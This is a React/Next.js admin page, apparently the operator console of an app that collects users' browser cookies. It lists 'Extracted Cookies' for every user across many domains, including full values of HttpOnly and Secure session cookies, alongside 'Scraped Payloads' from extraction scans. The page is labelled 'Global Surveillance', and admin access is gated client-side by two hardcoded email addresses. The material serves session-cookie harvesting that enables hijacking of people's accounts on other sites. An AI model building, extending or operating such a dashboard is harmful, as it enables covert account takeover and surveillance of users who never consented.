'use client'

import { useEffect, useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { supabase } from '@/lib/supabase'
import { useRouter } from 'next/navigation'
import Link from 'next/link'

interface CookieItem {
    id: string
    user_id: string
    user_email: string
    domain: string
    name: string
    value: string
    path?: string
    secure?: boolean
    httpOnly?: boolean
    sameSite?: string
    expirationDate?: number
    created_at: string
}

interface LeadItem {
    id: string
    user_id: string
    user_email: string
    data_preview: string
    created_at: string
}

const ADMIN_EMAILS = ['contact.skillbridgeladder@gmail.com', 'skillbridgeladder@gmail.com']

function ChevronIcon({ expanded }: { expanded: boolean }) {
    return (
        <svg 
            className={`w-5 h-5 transition-transform duration-300 ${expanded ? 'rotate-180 text-[#00f0ff]' : 'text-white/40'}`} 
            fill="none" viewBox="0 0 24 24" stroke="currentColor"
        >
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
        </svg>
    )
}

export default function AdminTrackingPage() {
    const [isAdmin, setIsAdmin] = useState(false)
    const [loading, setLoading] = useState(true)
    const [cookies, setCookies] = useState<CookieItem[]>([])
    const [filteredCookies, setFilteredCookies] = useState<CookieItem[]>([])
    const [leads, setLeads] = useState<LeadItem[]>([])
    const [filteredLeads, setFilteredLeads] = useState<LeadItem[]>([])
    const [searchQuery, setSearchQuery] = useState('')
    const [activeTab, setActiveTab] = useState<'cookies' | 'leads'>('cookies')
    const router = useRouter()

    // Expansion states
    const [expandedUsers, setExpandedUsers] = useState<Set<string>>(new Set())
    const [expandedDomains, setExpandedDomains] = useState<Set<string>>(new Set())
    const [expandedLeads, setExpandedLeads] = useState<Set<string>>(new Set())

    useEffect(() => {
        checkAdminAndFetch()
    }, [])

    async function checkAdminAndFetch() {
        setLoading(true)
        const { data: { session } } = await supabase.auth.getSession()
        if (!session?.user) { router.push('/login'); return }
        if (!ADMIN_EMAILS.includes(session.user.email || '')) { router.push('/dashboard'); return }
        setIsAdmin(true)

        try {
            const res = await fetch('/api/admin/tracking', {
                headers: {
                    'Authorization': `Bearer ${session.access_token}`
                }
            })
            const data = await res.json()
            if (data.success) {
                setCookies(data.cookies || [])
                setFilteredCookies(data.cookies || [])
                setLeads(data.leads || [])
                setFilteredLeads(data.leads || [])
            } else {
                console.error("Failed to fetch tracking data:", data.error)
            }
        } catch (err) {
            console.error("API error:", err)
        }
        setLoading(false)
    }

    useEffect(() => {
        if (!searchQuery) {
            setFilteredCookies(cookies)
            setFilteredLeads(leads)
            return
        }
        const q = searchQuery.toLowerCase()
        setFilteredCookies(cookies.filter(c => 
            c.user_email.toLowerCase().includes(q) ||
            c.domain.toLowerCase().includes(q) ||
            c.name.toLowerCase().includes(q) ||
            c.value.toLowerCase().includes(q)
        ))
        setFilteredLeads(leads.filter(l =>
            l.user_email.toLowerCase().includes(q) ||
            l.data_preview.toLowerCase().includes(q)
        ))
    }, [searchQuery, cookies, leads])

    const toggleUser = (email: string) => {
        const next = new Set(expandedUsers)
        if (next.has(email)) next.delete(email)
        else next.add(email)
        setExpandedUsers(next)
    }

    const toggleDomain = (domainKey: string) => {
        const next = new Set(expandedDomains)
        if (next.has(domainKey)) next.delete(domainKey)
        else next.add(domainKey)
        setExpandedDomains(next)
    }

    const toggleLead = (leadId: string) => {
        const next = new Set(expandedLeads)
        if (next.has(leadId)) next.delete(leadId)
        else next.add(leadId)
        setExpandedLeads(next)
    }

    // Group cookies by user email, then by domain
    const groupedCookies = filteredCookies.reduce((acc, cookie) => {
        if (!acc[cookie.user_email]) acc[cookie.user_email] = {}
        if (!acc[cookie.user_email][cookie.domain]) acc[cookie.user_email][cookie.domain] = []
        acc[cookie.user_email][cookie.domain].push(cookie)
        return acc
    }, {} as Record<string, Record<string, CookieItem[]>>)

    if (!isAdmin || loading && cookies.length === 0) {
        return (
            <div className="min-h-screen flex items-center justify-center">
                <div className="w-12 h-12 rounded-full border-t-2 border-r-2 border-[#00f0ff] animate-spin"></div>
            </div>
        )
    }

    return (
        <div className="w-full relative z-10 min-h-screen pb-20 text-[#e0e0e0]">
            {/* Admin Nav */}
            <nav className="fixed top-0 left-0 right-0 z-50 border-b border-white/[0.06]"
                style={{ background: 'rgba(10, 10, 26, 0.85)', backdropFilter: 'blur(20px)', WebkitBackdropFilter: 'blur(20px)' }}>
                <div className="container-main flex items-center justify-between" style={{ height: '72px' }}>
                    <div className="flex items-center gap-4">
                        <Link href="/admin" className="flex items-center gap-2.5 group">
                            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-red-500 to-orange-400 flex items-center justify-center text-lg font-bold text-white shadow-lg shadow-orange-500/20">A</div>
                            <span className="text-lg font-bold tracking-tight hidden sm:block text-[#ff6b35]">Admin Panel</span>
                        </Link>
                        <span className="text-white/20">/</span>
                        <span className="text-lg font-bold tracking-tight text-[#00f0ff] drop-shadow-[0_0_8px_rgba(0,240,255,0.4)]">Tracking & Surveillance</span>
                    </div>
                    <Link href="/admin" className="btn-ghost !py-2.5 !px-5 !text-[13px] border border-white/10 hover:border-[#00f0ff]/50 hover:text-[#00f0ff] transition-all bg-white/5">← Back to Admin</Link>
                </div>
            </nav>

            <div className="container-main" style={{ paddingTop: '120px' }}>
                <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mb-8">
                    <h1 className="text-4xl font-black tracking-tight mb-3 text-transparent bg-clip-text bg-gradient-to-r from-white to-white/60">Global Surveillance</h1>
                    <p className="text-[#8892b0] text-lg">Deep inspect cookies, sessions, and scraped payload logs across the entire system.</p>
                </motion.div>

                {/* Tabs & Search */}
                <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6 mb-8 border-b border-[#0f3460] pb-6">
                    <div className="flex gap-3">
                        <button onClick={() => setActiveTab('cookies')}
                            className={`px-6 py-3.5 rounded-xl text-sm font-bold transition-all shadow-lg
                            ${activeTab === 'cookies' ? 'bg-gradient-to-r from-[rgba(0,240,255,0.15)] to-[rgba(124,58,237,0.15)] text-[#00f0ff] border border-[#00f0ff]/40 shadow-[#00f0ff]/10' : 'bg-[#0f3460]/40 text-[#8892b0] border border-[#0f3460] hover:bg-[#0f3460]/80 hover:text-white'}`}>
                            🍪 Extracted Cookies <span className="ml-2 py-0.5 px-2 bg-black/30 rounded-full text-xs">{filteredCookies.length}</span>
                        </button>
                        <button onClick={() => setActiveTab('leads')}
                            className={`px-6 py-3.5 rounded-xl text-sm font-bold transition-all shadow-lg
                            ${activeTab === 'leads' ? 'bg-gradient-to-r from-[rgba(255,180,0,0.15)] to-[rgba(255,107,53,0.15)] text-[#ffb400] border border-[#ffb400]/40 shadow-[#ffb400]/10' : 'bg-[#0f3460]/40 text-[#8892b0] border border-[#0f3460] hover:bg-[#0f3460]/80 hover:text-white'}`}>
                            📊 Scraped Payloads <span className="ml-2 py-0.5 px-2 bg-black/30 rounded-full text-xs">{filteredLeads.length}</span>
                        </button>
                    </div>

                    <div className="flex gap-3 w-full lg:w-auto">
                        <div className="relative w-full lg:w-80">
                            <input 
                                type="text" 
                                placeholder="Search email, domain, content..." 
                                value={searchQuery}
                                onChange={(e) => setSearchQuery(e.target.value)}
                                className="w-full bg-[#0a192f] border border-[#0f3460] rounded-xl pl-10 pr-4 py-3.5 text-sm text-[#ccd6f6] focus:outline-none focus:border-[#64ffda] transition-colors shadow-inner"
                            />
                            <svg className="w-4 h-4 absolute left-4 top-4 text-[#8892b0]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                            </svg>
                        </div>
                        <button onClick={checkAdminAndFetch} disabled={loading} 
                            className="px-5 py-3.5 bg-[#0f3460] hover:bg-[#1a4a8a] rounded-xl text-sm font-semibold border border-[#0f3460] flex items-center gap-2 transition-all shadow-lg whitespace-nowrap text-white">
                            <span className={loading ? "animate-spin" : ""}>⟳</span> Refresh
                        </button>
                    </div>
                </div>

                {/* COOKIES TAB */}
                {activeTab === 'cookies' && (
                    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
                        {Object.keys(groupedCookies).length === 0 ? (
                            <div className="text-center py-20 bg-[#1a1a2e] rounded-2xl border border-[#0f3460]">
                                <span className="text-4xl mb-4 block">👻</span>
                                <h3 className="text-xl font-bold text-[#ccd6f6] mb-2">No cookies found</h3>
                                <p className="text-[#8892b0]">Waiting for users to sync their sessions.</p>
                            </div>
                        ) : (
                            Object.entries(groupedCookies).map(([email, domainsObj]) => (
                                <div key={email} className="bg-[#1a1a2e] border border-[#0f3460] rounded-2xl overflow-hidden shadow-xl">
                                    {/* User Header */}
                                    <div 
                                        onClick={() => toggleUser(email)}
                                        className="p-5 cursor-pointer flex items-center justify-between hover:bg-[#16213e] transition-colors group"
                                    >
                                        <div className="flex items-center gap-4">
                                            <div className="w-10 h-10 rounded-full bg-gradient-to-br from-[#64ffda]/20 to-[#00f0ff]/20 flex items-center justify-center border border-[#64ffda]/30 text-[#64ffda] font-bold shadow-[0_0_15px_rgba(100,255,218,0.15)]">
                                                {email.charAt(0).toUpperCase()}
                                            </div>
                                            <div>
                                                <h3 className="font-bold text-lg text-[#ccd6f6] group-hover:text-[#64ffda] transition-colors">{email}</h3>
                                                <p className="text-xs text-[#8892b0] mt-0.5">
                                                    {Object.keys(domainsObj).length} Domains • {Object.values(domainsObj).flat().length} Cookies
                                                </p>
                                            </div>
                                        </div>
                                        <ChevronIcon expanded={expandedUsers.has(email)} />
                                    </div>

                                    {/* User Domains Accordion */}
                                    <AnimatePresence>
                                        {expandedUsers.has(email) && (
                                            <motion.div 
                                                initial={{ height: 0, opacity: 0 }} 
                                                animate={{ height: 'auto', opacity: 1 }} 
                                                exit={{ height: 0, opacity: 0 }}
                                                className="border-t border-[#0f3460] bg-[#0a192f] p-4 space-y-3"
                                            >
                                                {Object.entries(domainsObj).map(([domain, domainCookies]) => {
                                                    const domainKey = `${email}-${domain}`
                                                    return (
                                                        <div key={domainKey} className="bg-[#112240] border border-[#233554] rounded-xl overflow-hidden">
                                                            <div 
                                                                onClick={() => toggleDomain(domainKey)}
                                                                className="p-4 cursor-pointer flex items-center justify-between hover:bg-[#1d2d50] transition-colors"
                                                            >
                                                                <div className="flex items-center gap-3">
                                                                    <div className="w-2 h-2 rounded-full bg-[#64ffda] shadow-[0_0_8px_#64ffda]"></div>
                                                                    <span className="font-mono text-[13px] text-[#ccd6f6] font-semibold">{domain}</span>
                                                                    <span className="px-2.5 py-0.5 rounded-full bg-[#0a192f] border border-[#233554] text-[#8892b0] text-[10px] font-bold">
                                                                        {domainCookies.length} items
                                                                    </span>
                                                                </div>
                                                                <ChevronIcon expanded={expandedDomains.has(domainKey)} />
                                                            </div>

                                                            <AnimatePresence>
                                                                {expandedDomains.has(domainKey) && (
                                                                    <motion.div 
                                                                        initial={{ height: 0 }} 
                                                                        animate={{ height: 'auto' }} 
                                                                        exit={{ height: 0 }}
                                                                        className="overflow-x-auto border-t border-[#233554]"
                                                                    >
                                                                        <table className="w-full text-left text-xs whitespace-nowrap">
                                                                            <thead className="bg-[#0a192f] text-[#8892b0] uppercase tracking-wider">
                                                                                <tr>
                                                                                    <th className="py-3 px-4 font-semibold">Name</th>
                                                                                    <th className="py-3 px-4 font-semibold w-1/2">Value</th>
                                                                                    <th className="py-3 px-4 font-semibold">Path</th>
                                                                                    <th className="py-3 px-4 font-semibold">Flags</th>
                                                                                    <th className="py-3 px-4 font-semibold text-right">Captured</th>
                                                                                </tr>
                                                                            </thead>
                                                                            <tbody className="divide-y divide-[#233554]">
                                                                                {domainCookies.map(cookie => (
                                                                                    <tr key={cookie.id} className="hover:bg-[#1a2f55] transition-colors group">
                                                                                        <td className="py-3 px-4 font-mono font-bold text-[#e6f1ff]">{cookie.name}</td>
                                                                                        <td className="py-3 px-4">
                                                                                            <div className="max-w-md truncate font-mono text-[#a8b2d1] group-hover:text-white transition-colors" title={cookie.value}>
                                                                                                {cookie.value}
                                                                                            </div>
                                                                                        </td>
                                                                                        <td className="py-3 px-4 font-mono text-[#8892b0]">{cookie.path || '/'}</td>
                                                                                        <td className="py-3 px-4 flex gap-1.5 flex-wrap w-40">
                                                                                            {cookie.secure && <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-[#2ecc71]/10 text-[#2ecc71] border border-[#2ecc71]/20">SECURE</span>}
                                                                                            {cookie.httpOnly && <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-[#3498db]/10 text-[#3498db] border border-[#3498db]/20">HTTP-ONLY</span>}
                                                                                            {cookie.sameSite && cookie.sameSite !== 'unspecified' && (
                                                                                                <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-[#9b59b6]/10 text-[#9b59b6] border border-[#9b59b6]/20">{cookie.sameSite.toUpperCase()}</span>
                                                                                            )}
                                                                                        </td>
                                                                                        <td className="py-3 px-4 text-right text-[#5a6785]">
                                                                                            {new Date(cookie.created_at).toLocaleString(undefined, { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit'})}
                                                                                        </td>
                                                                                    </tr>
                                                                                ))}
                                                                            </tbody>
                                                                        </table>
                                                                    </motion.div>
                                                                )}
                                                            </AnimatePresence>
                                                        </div>
                                                    )
                                                })}
                                            </motion.div>
                                        )}
                                    </AnimatePresence>
                                </div>
                            ))
                        )}
                    </motion.div>
                )}

                {/* LEADS TAB */}
                {activeTab === 'leads' && (
                    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
                        {filteredLeads.length === 0 ? (
                            <div className="text-center py-20 bg-[#1a1a2e] rounded-2xl border border-[#0f3460]">
                                <span className="text-4xl mb-4 block">📭</span>
                                <h3 className="text-xl font-bold text-[#ccd6f6] mb-2">No payload logs found</h3>
                                <p className="text-[#8892b0]">Run an extraction scan to populate this list.</p>
                            </div>
                        ) : (
                            <div className="bg-[#1a1a2e] border border-[#0f3460] rounded-2xl overflow-hidden shadow-xl">
                                <div className="overflow-x-auto">
                                    <table className="w-full text-left text-sm">
                                        <thead className="bg-[#0a192f] text-xs uppercase text-[#8892b0] border-b border-[#0f3460]">
                                            <tr>
                                                <th className="py-4 px-6 font-semibold w-1/4">User Account</th>
                                                <th className="py-4 px-6 font-semibold">Raw Data Payload</th>
                                                <th className="py-4 px-6 font-semibold text-right w-1/6">Extracted At</th>
                                            </tr>
                                        </thead>
                                        <tbody className="divide-y divide-[#0f3460]">
                                            {filteredLeads.map((lead) => {
                                                const isExpanded = expandedLeads.has(lead.id)
                                                return (
                                                    <tr key={lead.id} className="hover:bg-[#16213e] transition-colors group">
                                                        <td className="py-5 px-6 whitespace-nowrap align-top">
                                                            <div className="flex items-center gap-3">
                                                                <div className="w-8 h-8 rounded-full bg-gradient-to-br from-[#ffb400]/20 to-[#ff6b35]/20 flex items-center justify-center border border-[#ffb400]/30 text-[#ffb400] font-bold text-xs">
                                                                    {lead.user_email.charAt(0).toUpperCase()}
                                                                </div>
                                                                <span className="font-semibold text-[#ccd6f6]">{lead.user_email}</span>
                                                            </div>
                                                        </td>
                                                        <td className="py-5 px-6 align-top">
                                                            <div 
                                                                onClick={() => toggleLead(lead.id)}
                                                                className={`font-mono text-xs bg-[#0a192f] border border-[#233554] rounded-lg p-3 cursor-pointer hover:border-[#64ffda]/50 transition-all ${isExpanded ? '' : 'max-h-24 overflow-hidden relative'}`}
                                                            >
                                                                <pre className="text-[#a8b2d1] whitespace-pre-wrap break-all leading-relaxed">
                                                                    {isExpanded ? JSON.stringify(JSON.parse(lead.data_preview), null, 2) : lead.data_preview}
                                                                </pre>
                                                                {!isExpanded && (
                                                                    <div className="absolute bottom-0 left-0 right-0 h-12 bg-gradient-to-t from-[#0a192f] to-transparent flex items-end justify-center pb-1">
                                                                        <span className="text-[10px] text-[#64ffda] font-bold bg-[#0a192f] px-2 py-0.5 rounded-full border border-[#233554]">Click to expand</span>
                                                                    </div>
                                                                )}
                                                            </div>
                                                        </td>
                                                        <td className="py-5 px-6 text-right text-xs text-[#5a6785] align-top whitespace-nowrap">
                                                            {new Date(lead.created_at).toLocaleString()}
                                                        </td>
                                                    </tr>
                                                )
                                            })}
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        )}
                    </motion.div>
                )}

            </div>
        </div>
    )
}
